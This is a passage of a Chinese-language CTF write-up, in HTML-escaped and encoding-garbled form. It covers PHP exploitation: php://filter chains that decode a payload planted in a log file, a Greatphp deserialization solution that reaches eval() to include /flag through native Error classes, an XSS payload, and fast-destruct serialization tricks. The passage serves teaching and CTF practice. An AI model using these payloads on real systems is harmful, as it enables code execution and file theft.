&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">iconv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;UCS-2&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;payload.txt&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">quoted_printable_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">file_get_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;payload.txt&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">preg_replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/=\r\n/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$s&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$s&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¼€æ‰“ï¼šé¦–å…ˆå†™payloadï¼Œç„¶åç¬¬ä¸€ä¸ªè¿‡æ»¤å™¨&lt;/p>
&lt;pre tabindex="0">&lt;code>php://filter/write=convert.quoted-printable-decode/resource=log/error.txt
&lt;/code>&lt;/pre>&lt;p>ç¬¬äºŒä¸ª&lt;/p>
&lt;pre tabindex="0">&lt;code>php://filter/write=convert.iconv.ucs-2.utf-8/resource=log/error.txt
&lt;/code>&lt;/pre>&lt;p>ç¬¬ä¸‰ä¸ª&lt;/p>
&lt;pre tabindex="0">&lt;code>php://filter/write=convert.base64-decode/resource=log/error.txt
&lt;/code>&lt;/pre>&lt;p>è¿™é‡Œå‡ºç°ä¸€ä¸ªé—®é¢˜ï¼Œæœ«å°¾ç­‰å·å°‘ä¸€ä¸ªï¼Œæˆ‘ä»¬éœ€è¦åœ¨payloadæœ«å°¾å†åŠ ä¸€ä¸ª&lt;code>=00=3D&lt;/code>è®©ç­‰å·æ­£å¸¸éœ²å‡º&lt;/p>
&lt;p>æ”¹å¥½ä¹‹åæ¸…ç©ºæ—¥å¿—æ–‡ä»¶ï¼Œç›´æ¥ä¸‰ä¸ªè¿‡æ»¤å™¨ä¸€èµ·ç”¨&lt;/p>
&lt;pre tabindex="0">&lt;code>php://filter/read=convert.quoted-printable-decode|convert.iconv.ucs-2.utf-8|convert.base64-decode/resource=log/error.txt
&lt;/code>&lt;/pre>&lt;p>å¾—åˆ°flag&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="http://arsenetang.com/2021/11/29/WP%E7%AF%87%E4%B9%8B%E8%A7%A3%E6%9E%90GFCTF---%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E5%99%A8/">wp&lt;/a>&lt;/p>
&lt;h2 id="åŸç”ŸæŠ¥é”™å¼‚å¸¸ç±»">åŸç”ŸæŠ¥é”™/å¼‚å¸¸ç±»&lt;/h2>
&lt;h3 id="errorexception---ç»•md5">Error/Exception - ç»•md5&lt;/h3>
&lt;h3 id="æå®¢å¤§æŒ‘æˆ˜-2020greatphp">[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">SYCLOVER&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$syc&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$lover&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__wakeup&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">syc&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">lover&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">syc&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#75af00">md5&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">lover&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sha1&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">syc&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#75af00">sha1&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">lover&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/\&amp;lt;\?php|\(|\)|&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">|\&amp;#39;/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">syc&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$match&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">syc&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Try Hard !!&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;great&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;great&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¹³å¸¸éƒ½æ˜¯ç”¨æ•°ç»„ï¼Œä½†æ˜¯è¿™æ˜¯åœ¨ç±»é‡Œé¢ï¼Œæ•°ç»„å°±ä¸è¡Œäº†ï¼Œå¾—ç”¨åŸç”Ÿç±»&lt;code>Error&lt;/code>ï¼ˆphp7ï¼‰æˆ–&lt;code>Exception&lt;/code>ï¼ˆphp5 or 7ï¼‰ï¼Œå®ƒæœ‰&lt;code>__toString&lt;/code>æ–¹æ³•ï¼Œè¢«è§¦å‘åä¼šä»¥å­—ç¬¦ä¸²å½¢å¼è¾“å‡ºå½“å‰ä¿å­˜æƒ…å†µï¼ŒåŒ…æ‹¬é”™è¯¯ä¿¡æ¯å’Œå½“å‰æŠ¥é”™çš„è¡Œå·ï¼Œè€Œè·Ÿä¼ å…¥çš„å‚æ•°æ²¡æœ‰å…³ç³»ï¼›æ‰€ä»¥è¯´å¯ä»¥æ„é€ ä¸¤ä¸ªç±»çš„å®ä¾‹ï¼Œå®ƒä»¬è¡Œå·ç›¸åŒï¼ˆè¢«&lt;code>__toString&lt;/code>è°ƒç”¨åè¾“å‡ºä¿¡æ¯ä¸€æ ·ï¼‰ï¼Œä½†æ˜¯æœ¬èº«ä¸ç›¸åŒï¼ˆä¼ å…¥å‚æ•°ä¸ç­‰ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;?&amp;gt;&amp;lt;?=include~&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">urldecode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">~&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;?&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$payload&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">SYCLOVER&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$s&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">syc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$s&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">lover&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$s&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æ³¨æ„&lt;code>$a&lt;/code>å’Œ&lt;code>$b&lt;/code>å†™åˆ°ä¸€è¡Œ&lt;/p>
&lt;h3 id="errorexception---xss">Error/Exception - XSS&lt;/h3>
&lt;p>å‚è€ƒï¼š&lt;a href="https://www.cnblogs.com/NPFS/p/13385038.html">å…³äºå¦‚ä½•åˆ©ç”¨phpçš„åŸç”Ÿç±»è¿›è¡ŒXSS&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;)&amp;lt;/script&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$b&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="äºŒæ¬¡åºåˆ—åŒ–fast-destruct">äºŒæ¬¡åºåˆ—åŒ–/fast destruct&lt;/h2>
&lt;p>&lt;a href="https://zhuanlan.zhihu.com/p/405838002">https://zhuanlan.zhihu.com/p/405838002&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$raw&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;O:1:&amp;#34;A&amp;#34;:1:{s:1:&amp;#34;a&amp;#34;;s:1:&amp;#34;b&amp;#34;;}&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$raw&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//O:1:&amp;#34;A&amp;#34;:1:{s:1:&amp;#34;a&amp;#34;;s:1:&amp;#34;b&amp;#34;;}
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸Šé¢æ˜¯ä¸€ä¸ªç›¸å½“æ­£å¸¸çš„äºŒæ¬¡åºåˆ—åŒ–çš„æ —å­ï¼ˆå°†åºåˆ—åŒ–ç»“æœååºåˆ—åŒ–åå†åºåˆ—åŒ–ï¼‰ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯è¿™é‡Œå¹¶ä¸æ˜¯çœŸçš„æœ‰ä¸€ä¸ªç±»Aï¼Œåœ¨æ“ä½œæ—¶ phpå†…éƒ¨ä¼šæŠŠä¸å­˜åœ¨çš„ç±»è½¬æ¢æˆ&lt;code>__PHP_Incomplete_Class&lt;/code>è¿™ç§ç‰¹æ®Šçš„ç±»ï¼ŒåŒæ—¶å°†åŸå§‹çš„ç±»å&lt;code>A&lt;/code>å­˜æ”¾åœ¨&lt;code>__PHP_Incomplete_Class_Name&lt;/code>è¿™ä¸ªå±æ€§ä¸­ï¼Œå…¶ä½™å±æ€§å­˜æ”¾æ–¹å¼ä¸å˜ï¼›è€Œæˆ‘ä»¬åœ¨åºåˆ—åŒ–è¿™ä¸ªå¯¹è±¡çš„æ—¶å€™ï¼Œserializeé‡åˆ°&lt;code>__PHP_Incomplete_Class&lt;/code>è¿™ä¸ªç‰¹æ®Šç±»ä¼šå€’æ¨å›æ¥ï¼Œåºåˆ—åŒ–æˆ&lt;code>__PHP_Incomplete_Class_Name&lt;/code>å€¼ä¸ºç±»åçš„ç±»ï¼Œæˆ‘ä»¬çœ‹åˆ°çš„åºåˆ—åŒ–ç»“æœä¸æ˜¯&lt;code>O:22:&amp;quot;__PHP_Incomplete_Class_Name&amp;quot;:2:{xxx}&lt;/code>è€Œæ˜¯&lt;code>O:1:&amp;quot;A&amp;quot;:1:{s:1:&amp;quot;a&amp;quot;;s:1:&amp;quot;b&amp;quot;;}&lt;/code>ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬æ„é€ &lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$raw&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;a:2:{i:0;O:8:&amp;#34;stdClass&amp;#34;:1:{s:3:&amp;#34;abc&amp;#34;;N;}i:1;O:22:&amp;#34;__PHP_Incomplete_Class&amp;#34;:1:{s:3:&amp;#34;abc&amp;#34;;N;}}&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$raw&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$raw&lt;/span>&lt;span style="color:#111">))));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220421101436718.png" alt="image-20220421101436718">&lt;/p>
&lt;p>å¯ä»¥æ³¨æ„åˆ°åœ¨äºŒæ¬¡åºåˆ—åŒ–å&lt;code>__PHP_Incomplete_Class&lt;/code>ä¸ºç©ºï¼Œå‡ºç°&lt;code>serialize(unserialize($x))!=$x&lt;/code>çš„æƒ…å†µ&lt;/p>
&lt;h3 id="å¼ºç½‘æ¯-2021whereisuwebshell">[å¼ºç½‘æ¯ 2021]WhereIsUWebShell&lt;/h3>
&lt;p>&lt;a href="https://miaotony.xyz/2021/06/28/CTF_2021qiangwang/#toc-heading-5">https://miaotony.xyz/2021/06/28/CTF_2021qiangwang/#toc-heading-5&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;lt;!--&lt;/span> &lt;span style="color:#75af00">You&lt;/span> &lt;span style="color:#75af00">may&lt;/span> &lt;span style="color:#75af00">need&lt;/span> &lt;span style="color:#75af00">to&lt;/span> &lt;span style="color:#75af00">know&lt;/span> &lt;span style="color:#75af00">what&lt;/span> &lt;span style="color:#75af00">is&lt;/span> &lt;span style="color:#75af00">in&lt;/span> &lt;span style="color:#75af00">e2a7106f1cc8bb1e1318df70aa0a3540&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">php&lt;/span>&lt;span style="color:#f92672">--&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// index.php
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;display_errors&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;on&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ctfer&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">setcookie&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ctfer&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ctfer&amp;#34;&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#75af00">time&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">3600&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">include&lt;/span> &lt;span style="color:#d88200">&amp;#34;function.php&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;I see your Cookie&amp;lt;br&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">unserialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_COOKIE&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;ctfer&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/myclass/i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$res&lt;/span>&lt;span style="color:#111">))){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Error: Class &amp;#39;myclass&amp;#39; not found &amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
